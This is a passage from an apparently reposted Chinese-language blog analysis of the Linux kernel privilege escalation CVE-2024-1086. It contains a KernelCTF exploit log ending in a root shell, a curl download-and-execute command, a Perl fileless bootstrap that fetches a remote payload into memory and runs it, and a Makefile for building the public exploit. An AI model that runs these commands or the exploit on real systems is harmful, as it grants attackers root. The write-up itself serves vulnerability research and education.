<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">user@lts-6:/$ <span class="built_in">id</span></span><br><span class="line">uid=1000(user) gid=1000(user) <span class="built_in">groups</span>=1000(user)</span><br><span class="line"></span><br><span class="line">user@lts-6:/$ curl https://cno.pwning.tech/aaaabbbb-cccc-dddd-eeee-ffffgggghhhh -o /tmp/exploit &amp;&amp; <span class="built_in">cd</span> /tmp &amp;&amp; <span class="built_in">chmod</span> +x exploit &amp;&amp; ./exploit</span><br><span class="line">  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</span><br><span class="line">                                 Dload  Upload   Total   Spent    Left  Speed</span><br><span class="line">100  161k  100  161k    0     0   823k      0 --:--:-- --:--:-- --:--:--  823k</span><br><span class="line"></span><br><span class="line">[*] creating user namespace (CLONE_NEWUSER)...</span><br><span class="line">[*] creating network namespace (CLONE_NEWNET)...</span><br><span class="line">[*] setting up UID namespace...</span><br><span class="line">[*] configuring localhost <span class="keyword">in</span> namespace...</span><br><span class="line">[*] setting up nftables...</span><br><span class="line">[+] running normal privesc</span><br><span class="line">[*] waiting <span class="keyword">for</span> the calm before the storm...</span><br><span class="line">[*] sending double free buffer packet...</span><br><span class="line">[*] spraying 16000 pte<span class="string">&#x27;s...</span></span><br><span class="line"><span class="string">[   13.592791] ------------[ cut here ]------------</span></span><br><span class="line"><span class="string">[   13.594923] WARNING: CPU: 0 PID: 229 at mm/slab_common.c:985 free_large_kmalloc+0x3c/0x60</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">[   13.746361] ---[ end trace 0000000000000000 ]---</span></span><br><span class="line"><span class="string">[   13.748375] object pointer: 0x000000003d8afe8c</span></span><br><span class="line"><span class="string">[*] checking 16000 sprayed pte&#x27;</span>s <span class="keyword">for</span> overlap...</span><br><span class="line">[+] confirmed double alloc PMD/PTE</span><br><span class="line">[+] found possible physical kernel base: 0000000014000000</span><br><span class="line">[+] verified modprobe_path/usermodehelper_path: 0000000016877600 (<span class="string">&#x27;/sanitycheck&#x27;</span>)...</span><br><span class="line">[*] overwriting path with PIDs <span class="keyword">in</span> range 0-&gt;4194304...</span><br><span class="line">[   14.409252] process <span class="string">&#x27;exploit&#x27;</span> launched <span class="string">&#x27;/dev/fd/13&#x27;</span> with NULL argv: empty string added</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">root@lts-6:/# id</span></span><br><span class="line"><span class="string">uid=0(root) gid=0(root) groups=0(root)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root@lts-6:/# cat /flag</span></span><br><span class="line"><span class="string">kernelCTF&#123;v1:mitigation-v3-6.1.55:1705665799:...&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">root@lts-6:/# </span></span><br></pre></td></tr></table></figure></div>
<p><strong>代码块 5.1.7.1</strong>：一次 KernelCTF 漏洞利用尝试的日志，获得了 root shell。</p>
<p>从实际操作的角度来看，用户可以将 PID 从内核警告中复制&#x2F;粘贴到 KernelCTF 远程实例中的漏洞利用 stdin 中，但我希望通过暴力破解 PIDs 来使我的漏洞利用也能在其他基础设施上运行。</p>
<p>当目标机器安装了 Perl 时，漏洞利用支持无文件执行。当目标文件系统是只读时，这很好用。它通过将 <code>modprobe_path</code> 设置为 <code>/proc/&lt;exploit_pid&gt;/fd/&lt;target_script&gt;</code> 等方式实现。</p>
<div class="code-container" data-rel="Perl"><figure class="iseeu highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;</span></span><br><span class="line"><span class="string">  require qw/syscall.ph/;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  my $fd = syscall(SYS_memfd_create(), $fn, 0);</span></span><br><span class="line"><span class="string">  open(my $fh, &quot;&gt;&amp;=&quot;.$fd);</span></span><br><span class="line"><span class="string">  print $fh `curl https://example.com/exploit -s`;</span></span><br><span class="line"><span class="string">  exec &#123;&quot;/proc/$$/fd/$fd&quot;&#125; &quot;memfd&quot;;</span></span><br><span class="line"><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure></div>
<p><strong>代码块 5.1.7.2</strong>：使用 Perl 的漏洞利用引导脚本，无需写入磁盘即可执行（无文件执行）。</p>
<h2 id="5-2-源代码"><a href="#5-2-源代码" class="headerlink" title="5.2 源代码"></a>5.2 源代码</h2><p>漏洞利用的源代码可以在我的 <a class="link"   target="_blank" rel="noopener" href="https://github.com/Notselwyn/CVE-2024-1086" >CVE-2024-1086 PoC 仓库<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>中找到。与我所有的软件项目一样，我也尝试关注开发者体验。因此，漏洞利用源代码已分散到多个文件中，以实现关注点分离，只有应该在其他文件中调用的函数才会被导出（放在 <code>.h</code> 文件中），而所有其他函数都标记为静态的。这与面向对象编程语言的公共&#x2F;私有属性非常相似。</p>
<p>此外，我决定让漏洞利用在发生错误时崩溃&#x2F;退出，而不是正确返回错误。我之所以这样做，是因为返回错误代码没有增加任何价值，因为它的目的是作为一个独立的二进制文件而不是一个库。因此，如果有人出于某种原因决定将这些函数嵌入到库中，从语义上讲，他们应该使函数返回错误代码。</p>
<p>如果我遗漏了任何重要的语义，请随时通过博客文章底部的联系信息给我发私信。</p>
<h2 id="5-3-编译漏洞利用"><a href="#5-3-编译漏洞利用" class="headerlink" title="5.3 编译漏洞利用"></a>5.3 编译漏洞利用</h2><h3 id="5-3-1-依赖项"><a href="#5-3-1-依赖项" class="headerlink" title="5.3.1 依赖项"></a>5.3.1 依赖项</h3><p>漏洞利用有两个依赖项：<code>libnftnl-dev</code> 和 <code>libmnl-dev</code>。<code>libmnl</code> 解析和构造 netlink 头，而 <code>libnftnl</code> 可能为用户构建类似于 netfilter 的对象（如链和表），并将它们序列化为 <code>libmnl</code> 的 netlink 消息。这是一个强大的组合，允许用户完成漏洞利用所需的任何操作。</p>
<p>遗憾的是，我必须为漏洞利用做一些调整。在漏洞利用的仓库中，我添加了一个 <code>.a</code>（ar 存档）文件，用于用 musl-gcc 编译的库，这基本上是一个编译器理解的对象文件的 <code>.zip</code>。这允许使用 musl-gcc 静态链接这些库。我不得不下载一个单独的 <code>libmnl-dev</code> 版本，这在下面的部分中列出。幸运的是，对于最终用户来说，这意味着他们不必单独安装这些库。</p>
<h3 id="5-3-2-Makefile"><a href="#5-3-2-Makefile" class="headerlink" title="5.3.2 Makefile"></a>5.3.2 Makefile</h3><p>为了静态编译适用于 KernelCTF 的漏洞利用，我使用了以下 makefile：</p>
<p><strong>代码块 5.3.2.1</strong>：用于静态编译漏洞利用的 Makefile。</p>
<div class="code-container" data-rel="Makefile"><figure class="iseeu highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">SRC_FILES := src/main.c src/env.c src/net.c src/nftnl.c src/file.c</span><br><span class="line">OUT_NAME = ./exploit</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用 musl-gcc，因为使用 glibc 和 gcc 进行静态链接时会为 qemu 生成无效操作码</span></span><br><span class="line"><span class="comment"># 并且动态链接会导致 glibc ABI 版本错误</span></span><br><span class="line">CC = musl-gcc</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用带固定版本的自定义头文件，使其与 musl-gcc 兼容</span></span><br><span class="line"><span class="comment"># - ./include/libmnl: libmnl v1.0.5</span></span><br><span class="line"><span class="comment"># - ./include/libnftnl: libnftnl v1.2.6</span></span><br><span class="line"><span class="comment"># - ./include/linux-lts-6.1.72: linux v6.1.72</span></span><br><span class="line">CFLAGS = -I./<span class="keyword">include</span> -I./<span class="keyword">include</span>/linux-lts-6.1.72 -Wall -Wno-deprecated-declarations</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用用 musl-gcc 编译的自定义对象存档以实现兼容性。正常的那些</span></span><br><span class="line"><span class="comment"># 与 gcc 一起使用并包含 musl 不支持的 `_chk` 函数</span></span><br><span class="line"><span class="comment"># 版本与上面的头文件相同</span></span><br><span class="line">LIBMNL_PATH = ./lib/libmnl.a</span><br><span class="line">LIBNFTNL_PATH = ./lib/libnftnl.a</span><br><span class="line"></span><br><span class="line"><span class="section">exploit: _compile_static _strip_bin</span></span><br><span class="line"><span class="section">clean:</span></span><br><span class="line">	rm <span class="variable">$(OUT_NAME)</span></span><br><span class="line"></span><br><span class="line"><span class="section">_compile_static:</span></span><br><span class="line">	<span class="variable">$(CC)</span> <span class="variable">$(CFLAGS)</span> <span class="variable">$(SRC_FILES)</span> -o <span class="variable">$(OUT_NAME)</span> -static <span class="variable">$(LIBNFTNL_PATH)</span> <span class="variable">$(LIBMNL_PATH)</span></span><br><span class="line"><span class="section">_strip_bin:</span></span><br><span class="line">	strip <span class="variable">$(OUT_NAME)</span></span><br></pre></td></tr></table></figure></div>
<h3 id="5-3-3-静态编译备注与错误"><a href="#5-3-3-静态编译备注与错误" class="headerlink" title="5.3.3 静态编译备注与错误"></a>5.3.3 静态编译备注与错误</h3><blockquote>
<p>本节仅用于解决尝试静态编译其自己漏洞利用的人的问题。</p>
</blockquote>
<h4 id="5-3-3-1-libmnl-找不到"><a href="#5-3-3-1-libmnl-找不到" class="headerlink" title="5.3.3.1 libmnl 找不到"></a>5.3.3.1 <code>libmnl</code> 找不到</h4><p>在使用 <code>apt</code> 和 <code>gcc</code> 编译的过程中生活得很安逸时，我遇到的一个问题是 <code>libmnl-dev</code> —— 其中一个包含 netlink 函数的库 —— 在 Debian 稳定仓库中的 <code>.a</code> 文件在撰写本文时是无效的。尝试静态编译时，会看到类似以下内容的输出：</p>
<p><strong>代码块 5.3.3.1.1</strong>：包含无法解析 <code>libmnl</code> 的链接错误的 Shell 错误输出。</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/ld: cannot find -lmnl: No such file or directory </span><br><span class="line">collect2: error: ld returned 1 <span class="built_in">exit</span> status </span><br><span class="line">make: *** [Makefile:17: _compile_static] Error 1</span><br></pre></td></tr></table></figure></div>
<p>要修复这个问题，请安装当前在不稳定仓库中的 <code>libmnl</code> 包：<code>sudo apt install libmnl-dev/sid</code>（<code>*/sid</code> 安装来自 Debian 不稳定仓库的包）。</p>
<p>否则，只需克隆 <code>libmnl</code> 仓库，使用 gcc 自行编译该库，并创建 <code>.a</code> 文件。</p>
<h4 id="5-3-3-2-无效操作码-AVX-乐趣"><a href="#5-3-3-2-无效操作码-AVX-乐趣" class="headerlink" title="5.3.3.2 无效操作码 - AVX 乐趣"></a>5.3.3.2 无效操作码 - AVX 乐趣</h4><p>我在使用 <code>gcc</code> 和 <code>glibc</code> 静态编译漏洞利用时遇到的最后一个问题是使用了不支持的指令——特别是不支持的 AVX（512）指令，通过在 Ghidra 中打开二进制文件并查看 RIP 地址可以观察到这一点。x86 扩展 AVX512 包含对服务器 CPU 支持的更大寄存器的指令。通常，<code>gcc</code> 使用正在运行的 CPU 的架构和支持的指令来轮询其指令支持，例如使用 CPUID。然而，我是在我的 Intel Xeon CPU 上使用 <code>-cpu host</code> 参数在 QEMU VM 中编译漏洞利用的，该 CPU 支持 AVX512。</p>
<p>问题在于 QEMU——至少在那个版本中——不支持 AVX512 扩展。因此，漏洞利用在 QEMU 中有 50% 的几率会因为不支持的操作码（指令）而引发 CPU 陷阱。这些指令被执行的原因又是一个复杂的问题。</p>
<p><strong>代码块 5.3.3.2.1</strong>：<code>dmesg</code> 输出包含无效操作码错误（CPU 陷阱）。</p>
<div class="code-container" data-rel="Sh"><figure class="iseeu highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[   15.211423] traps: exploit[167] <span class="built_in">trap</span> invalid opcode ip:433db9 sp:7ffcb0682ee8 error:0 <span class="keyword">in</span> exploit[401000+92000]</span><br></pre></td></tr></table></figure></div>
<p>我通过简单地移除 QEMU VM 的 <code>-cpu host</code> 参数解决了这个问题，并在该 VM 中编译漏洞利用，因为它将使用 QEMU 实际支持的 CPU 属性，因此 <code>gcc</code> 不再使用 AVX512，因为 CPUID 不会伪造 AVX512 支持。</p>
<p>遗憾的是，KernelCTF 实例始终启用了 <code>-cpu host</code> 参数。幸运的是，KernelCTF 社区告诉我需要使用 <code>musl-gcc</code> 静态编译漏洞利用，因为 <code>glibc</code> 并不适合静态编译。</p>
<h1 id="6-讨论"><a href="#6-讨论" class="headerlink" title="6. 讨论"></a>6. 讨论</h1><h2 id="6-1-双重释放方法"><a href="#6-1-双重释放方法" class="headerlink" title="6.1 双重释放方法"></a>6.1 双重释放方法</h2><p>在文章中，我展示了两种方法将 <code>order==0</code> 页和 <code>order==4</code> 页分配到相同地址：清空 PCP 列表和竞态条件。前者使后者过时，因为它不依赖竞态条件。</p>
<p>竞态条件方法只在使用虚拟机且 emulated serial TTY (即非 virtio-serial) 的情况下有效，因为物理系统上的竞态窗口过小（大约 1 毫秒，相较于虚拟机中的 50 毫秒到 300 毫秒）。幸运的是，这个延迟在 KernelCTF 中是 300 毫秒，因此允许我使用这种方法。</p>
<p>我对这种方法的质量和稳定性并不满意，因此在接下来一个多月的时间里对利用程序进行了改进，并想出了第二种方法：通过排空 PCP 列表来从伙伴分配器中分配页面。</p>
<p>我刚开始编写利用程序时并不了解伙伴分配器和 PCP 分配器的内部机制，直到深入研究分配器的内部工作原理，我才明白如何适当利用它们。因此，我最大的收获之一就是在试图滥用某个系统之前，先充分理解它，因为这总会带来优势。</p>
<h2 id="6-2-后期稳定性"><a href="#6-2-后期稳定性" class="headerlink" title="6.2 后期稳定性"></a>6.2 后期稳定性</h2><p>由于本文的概念验证利用程序利用了 sk_buff 的双重释放，并且需要处理被损坏的 skb，我们必须处理在网络活动期间产生的空闲列表中的噪音。当数据包被传输或接收时，skb 会从空闲列表中分配和释放。当前，我们通过在双重释放期间禁用标准输出来尽量减少这一情况，这在利用程序通过 SSH 或反向 shell 运行时很有帮助。</p>
<p>然而，在某些硬件系统上（如硬件设置表中的 Debian 系统），利用程序似乎在几秒钟后仍会导致系统崩溃。我尚未对此进行深入调查，但我怀疑这可能是因为硬件测试设备是笔记本电脑，因此具有 WiFi 适配器。由于 WiFi 帧（可能并不直接发送到设备上）也是 skb，因此在高流量 WiFi 网络上连接的 WiFi 设备可能会不稳定。当在 BIOS 中禁用 WiFi 适配器后，利用程序运行正常，这支持了这一理论。</p>
<p>如果研究人员希望在利用后提高利用程序的稳定性，他们可能需要操作 SLUB 分配器以使损坏的 skb 不可用，或者使用 Dirty Pagedirectory 来解决此问题。</p>
<h1 id="7-心态与签名"><a href="#7-心态与签名" class="headerlink" title="7. 心态与签名"></a>7. 心态与签名</h1><h2 id="7-1-VR-心态"><a href="#7-1-VR-心态" class="headerlink" title="7.1 VR 心态"></a>7.1 VR 心态</h2><p>在解决这个项目时，我专注于三个关键目标：确保广泛兼容性、稳定性和隐蔽执行。本质上，这最终成为了一个非常强大的内核权限升级利用程序。此外，我还尝试尽可能保持代码库优雅，充分利用了我的软件工程背景。</p>
<p>这意味着除了 2 个月的开发期外，还有 2 个月用于改进利用程序以提高稳定性和兼容性。我决定走这条路，因为我想在这篇博文中展示我的技术能力（也是为了挑战自己）。</p>
<p>这意味着要以不同的方式思考：我需要利用那些旨在用于数据的子系统中的正常行为，并且这些行为将在广泛的系统中可用。这在利用技术中得到了体现，因为我只使用了 IPv4 子系统和虚拟内存，这在几乎所有的内核构建中都已启用。事实上，利用程序的主要工作是为了命中特定的代码路径（如从 1.1.1.1 到 255.255.255.255 发送的数据包）并使其变得优雅。</p>
<p>另外，我并没有在利用程序本身中滥用 slab 分配器的行为：只是在掩盖 sk_buff 对象和初始 kmalloc&#x2F;kfree 调用时使用它们，这些调用最终传递给了页面分配器。因此，利用程序不受 slab 分配器行为的影响，因为它们由于引入了诸如随机 kmalloc 缓存等新缓解措施，行为会随着版本变化而变化。不幸的是，最初的漏洞需要无特权的用户命名空间和 nftables。其他技术，如 Dirty Pagedirectory 和 PCP 排空，应能不依赖于此而在真实世界的利用中使用。</p>
<h2 id="7-2-反思"><a href="#7-2-反思" class="headerlink" title="7.2 反思"></a>7.2 反思</h2><p>我在研究漏洞和开发利用技术时玩得非常愉快，并且真的投入于使利用程序工作中。之前从来没有哪个项目让我在开发过程中如此兴奋，尤其是第一次使用漏洞获得 root shell 的时候。此外，我也对 Linux 内核的网络子系统（从 nftables 到 IP 分片到 IP 处理代码）和内存管理子系统（从分配器到页表）有了更深的了解。</p>
<p>在我所有的 IT 领域经验中——从软件工程到网络工程再到安全工程——这是最有趣的一个项目，并且是我迄今为止遇到的最大挑战之一。</p>
<p>此外，它还给了我其他项目的灵感，我想开发并发布这些项目以回馈社区。不过，在它们准备好之前，它们还将保持秘密状态。:^)</p>
<h2 id="7-3-致谢"><a href="#7-3-致谢" class="headerlink" title="7.3 致谢"></a>7.3 致谢</h2><p>我要感谢以下人员以各种方式对这篇博文的贡献：</p>
<ul>
<li>@ky1ebot (Twitter&#x2F;X): 详细的同行评审。</li>
<li>@daanbreur (Github): 帮助选择图表配色方案。</li>
</ul>
<p>另外，我尝试在相关章节中链接我所使用的所有博文、文章等。如果你认为我在未提供引用的情况下使用了你的技术，请联系我，我会在相关章节中链接你的博文。</p>
<h2 id="7-4-签名"><a href="#7-4-签名" class="headerlink" title="7.4 签名"></a>7.4 签名</h2><p>感谢阅读，能够呈现这篇文章是我的荣幸。</p>
<p>如有专业需求，请联系 <a class="link"   href="mailto:&#110;&#111;&#x74;&#115;&#101;&#108;&#x77;&#x79;&#110;&#x40;&#112;&#119;&#110;&#x69;&#x6e;&#103;&#x2e;&#x74;&#101;&#x63;&#x68;" >&#110;&#111;&#x74;&#115;&#101;&#108;&#x77;&#x79;&#110;&#x40;&#112;&#119;&#110;&#x69;&#x6e;&#103;&#x2e;&#x74;&#101;&#x63;&#x68;<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>（PGP 密钥），我很乐意讨论各种想法和可能性。如有其他事情，也欢迎在 Twitter 上私信我：@notselwyn。</p>
<p>Notselwyn<br>2024年3月</p>

		</div>

		
		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
			<div class="article-copyright-info-container">
    <ul>
        <li><strong>Title:</strong> CVE-2024-1086 分析</li>
        <li><strong>Author:</strong> sky123</li>
        <li><strong>Created at
                :</strong> 2024-11-12 01:06:07</li>
        
            <li>
                <strong>Updated at
                    :</strong> 2024-11-16 03:03:21
            </li>
        
        <li>
            <strong>Link:</strong> https://skyi23.github.io/2024/11/12/CVE-2024-1086/
        </li>
        <li>
            <strong>
                License:
            </strong>
            

            
                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
            
        </li>
    </ul>
</div>

		</div>
		

		

		

		
		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
			
			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="prev" rel="prev" href="/2024/11/12/hexo%20%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA%E6%95%99%E7%A8%8B/">
					<span class="left arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-left"></i>
					</span>
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item">Hexo 博客搭建教程</span>
						<span class="post-nav-item">Prev posts</span>
					</span>
				</a>
			</div>
			
			
			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="next" rel="next" href="/2024/11/11/Java%20Web%20%E5%BC%80%E5%8F%91%E5%9F%BA%E7%A1%80/">
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item">Java Web 开发基础</span>
						<span class="post-nav-item">Next posts</span>
					</span>
					<span class="right arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-right"></i>
					</span>
				</a>
			</div>
			
		</div>
		


		
		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
			<div class="comments-container mt-10 w-full ">
    <div id="comment-anchor" class="w-full h-2.5"></div>
    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
        Comments
    </div>
    

        
            
    <div id="giscus-container"></div>
    <script data-swup-reload-script defer>
        async function loadGiscus() {
            const giscusConfig = {
                'src': 'https://giscus.app/client.js',
                'data-repo': 'skyI23/my-giscus-discussions',
                'data-repo-id': 'R_kgDONL9k_w',
                'data-category': 'Announcements',
                'data-category-id': 'DIC_kwDONL9k_84CkEdK',
                'data-mapping': 'pathname',
                'data-strict': '0',
                'data-reactions-enabled': '1',
                'data-emit-metadata': '1',
                'data-theme': 'preferred_color_scheme',
                'data-lang': 'zh-CN',
                'data-input-position': 'bottom',
                'data-loading': 'lazy',
                'crossorigin': 'anonymous',
                'async': true
            }
            const giscusScript = document.createElement('script');
            for (const key in giscusConfig) {
                giscusScript.setAttribute(key, giscusConfig[key]);
            }
            document.getElementById('giscus-container').appendChild(giscusScript);
        }
        if ('true') {
            let loadGiscusTimeout = setTimeout(() => {
                loadGiscus();
                clearTimeout(loadGiscusTimeout);
            }, 1000);
        } else {
            document.addEventListener('DOMContentLoaded', loadGiscus);
        }
    </script>


        
        
    
</div>

		</div>
		
	</div>

	
	<div class="toc-content-container">
		<div class="post-toc-wrap">
	<div class="post-toc">
		<div class="toc-title">On this page</div>
		<div class="page-title">CVE-2024-1086 分析</div>
		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0-%E9%98%85%E8%AF%BB%E5%89%8D%E7%9A%84%E8%AF%B4%E6%98%8E"><span class="nav-text">0. 阅读前的说明</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0-1-%E5%A6%82%E4%BD%95%E9%98%85%E8%AF%BB%E8%BF%99%E7%AF%87%E5%8D%9A%E5%AE%A2%E6%96%87%E7%AB%A0"><span class="nav-text">0.1 如何阅读这篇博客文章</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0-2-%E5%8F%97%E5%BD%B1%E5%93%8D%E7%9A%84%E5%86%85%E6%A0%B8%E7%89%88%E6%9C%AC"><span class="nav-text">0.2 受影响的内核版本</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#1-%E6%A6%82%E8%BF%B0"><span class="nav-text">1. 概述</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-1-%E6%91%98%E8%A6%81"><span class="nav-text">1.1 摘要</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-2-%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B"><span class="nav-text">1.2 工作流程</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#2-%E8%83%8C%E6%99%AF%E4%BF%A1%E6%81%AF"><span class="nav-text">2. 背景信息</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#2-1-nf-tables"><span class="nav-text">2.1. nf_tables</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-1-Netfilter-%E5%B1%82%E6%AC%A1%E7%BB%93%E6%9E%84"><span class="nav-text">2.1.1. Netfilter 层次结构</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-2-Netfilter-%E5%88%A4%E5%86%B3%EF%BC%88Verdicts%EF%BC%89"><span class="nav-text">2.1.2. Netfilter 判决（Verdicts）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-2-sk-buff-skb"><span class="nav-text">2.2. sk_buff (skb)</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-3-IP-%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E7%89%87"><span class="nav-text">2.3. IP 数据包分片</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-4-%E9%A1%B5%E5%88%86%E9%85%8D"><span class="nav-text">2.4. 页分配</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-5-%E7%89%A9%E7%90%86%E5%86%85%E5%AD%98"><span class="nav-text">2.5. 物理内存</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-5-1-%E7%89%A9%E7%90%86%E5%88%B0%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E6%98%A0%E5%B0%84"><span class="nav-text">2.5.1. 物理到虚拟内存映射</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-5-2-%E9%A1%B5%E8%A1%A8"><span class="nav-text">2.5.2. 页表</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-6-TLB-%E5%88%B7%E6%96%B0"><span class="nav-text">2.6. TLB 刷新</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-7-Dirty-Pagetable"><span class="nav-text">2.7. Dirty Pagetable</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-8-%E8%A6%86%E7%9B%96-modprobe-path"><span class="nav-text">2.8. 覆盖 modprobe_path</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-9-KernelCTF"><span class="nav-text">2.9. KernelCTF</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#3-%E6%BC%8F%E6%B4%9E"><span class="nav-text">3. 漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#3-1-%E5%8F%91%E7%8E%B0%E6%BC%8F%E6%B4%9E"><span class="nav-text">3.1. 发现漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-2-%E6%A0%B9%E6%9C%AC%E5%8E%9F%E5%9B%A0%E5%88%86%E6%9E%90"><span class="nav-text">3.2 根本原因分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-3-%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%BD%B1%E5%93%8D%E4%B8%8E%E5%88%A9%E7%94%A8"><span class="nav-text">3.3. 漏洞的影响与利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-4-%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="nav-text">3.4. 漏洞修复</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#4-%E6%8A%80%E6%9C%AF"><span class="nav-text">4. 技术</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#4-1-%E9%A1%B5%E9%9D%A2%E5%BC%95%E7%94%A8%E8%AE%A1%E6%95%B0%E6%93%8D%E6%8E%A7"><span class="nav-text">4.1 页面引用计数操控</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-2-%E9%A1%B5%E9%9D%A2%E7%A9%BA%E9%97%B2%E5%88%97%E8%A1%A8%E6%9D%A1%E7%9B%AE%E4%BB%8E-order-4-%E5%88%B0-order-0"><span class="nav-text">4.2 页面空闲列表条目从 order 4 到 order 0</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#4-2-1-%E6%B8%85%E7%A9%BA-PCP-%E5%88%97%E8%A1%A8"><span class="nav-text">4.2.1 清空 PCP 列表</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#4-2-2-%E7%AB%9E%E6%80%81%E6%9D%A1%E4%BB%B6%EF%BC%88%E5%B7%B2%E8%BF%87%E6%97%B6%EF%BC%89"><span class="nav-text">4.2.2 竞态条件（已过时）</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-3-%E7%9B%B4%E6%8E%A5%E9%87%8A%E6%94%BE-skb-%E8%80%8C%E4%B8%8D%E4%BD%BF%E7%94%A8-UDP-TCP-%E5%A0%86%E6%A0%88"><span class="nav-text">4.3 直接释放 skb 而不使用 UDP&#x2F;TCP 